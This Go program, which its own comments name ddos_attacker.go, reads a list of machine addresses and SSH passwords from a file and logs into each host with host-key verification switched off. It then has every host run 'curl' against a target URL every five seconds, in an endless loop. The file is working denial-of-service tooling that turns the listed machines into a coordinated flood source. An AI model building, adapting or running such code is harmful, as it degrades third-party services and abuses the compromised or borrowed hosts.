package main

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type SSHClient struct {
	IP       string
	Port     string
	Username string
	Password string
	Client   *ssh.Client
}

var target_url string = "https://www.google.com"

func NewSSHClient(ip, port, username, password string) *SSHClient {
	fmt.Printf("Creating new SSH client for machine: %s:%s\n", ip, port)
	return &SSHClient{
		IP:       ip,
		Port:     port,
		Username: username,
		Password: password,
	}
}

func (s *SSHClient) Connect(ctx context.Context) error {
	fmt.Printf("Connecting to machine: %s:%s\n", s.IP, s.Port)
	config := &ssh.ClientConfig{
		User: s.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(s.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	dialer := net.Dialer{}
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(s.IP, s.Port))
	if err != nil {
		return fmt.Errorf("failed to dial: %v", err)
	}

	ncc, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(s.IP, s.Port), config)
	if err != nil {
		return fmt.Errorf("failed to create new SSH client connection: %v", err)
	}

	s.Client = ssh.NewClient(ncc, chans, reqs)
	fmt.Printf("Connected to machine: %s:%s\n", s.IP, s.Port)
	return nil
}

func (s *SSHClient) ExecuteCommand(command string) error {
	fmt.Printf("Executing command: %s on machine: %s:%s\n", command, s.IP, s.Port)
	for {
		session, err := s.Client.NewSession()
		if err != nil {
			return fmt.Errorf("failed to create session: %v", err)
		}

		err = session.Run(command)
		if err != nil {
			session.Close()
			return fmt.Errorf("failed to run command: %v", err)
		}

		session.Close()
		fmt.Printf("Command executed successfully on machine: %s:%s\n", s.IP, s.Port)
		time.Sleep(5 * time.Second)
	}
}

func main() {
	// Old version, where all machines are hardcoded in the code, keep this because maybe in the future if I want to have an executable it will be useful
	// clients := []*SSHClient{
	// 	NewSSHClient("127.0.0.1", "2222", "root", "password"),
	// 	// Add more machines here
	// }
	var clients []*SSHClient

	// Read from file
	file, err := os.Open("machines_info.txt")
	if err != nil {
		fmt.Println("Error opening the file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Split(line, ",")
		clients = append(clients, NewSSHClient(fields[0], fields[1], fields[2], fields[3]))
	}

	var wg sync.WaitGroup

	for _, client := range clients {
		wg.Add(1)

		go func(client *SSHClient) {
			defer wg.Done()

			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			err := client.Connect(ctx)
			if err != nil {
				fmt.Println("Failed to connect: ", err)
				return
			}
			var command string = "curl " + target_url
			err = client.ExecuteCommand(command)
			if err != nil {
				fmt.Println("Failed to execute command: ", err)
			}
		}(client)
	}

	wg.Wait()
	fmt.Println("All tasks completed!")
}

// go mod tidy (if there are any issues)
// go get golang.org/x/crypto/ssh
// go run ddos_attacker.go
// go build
// this Go program creates an SSH client for each machine specified in a text file,
// connects to each machine simultaneously,
// and repeatedly executes a curl command on each machine every 5 seconds.
//
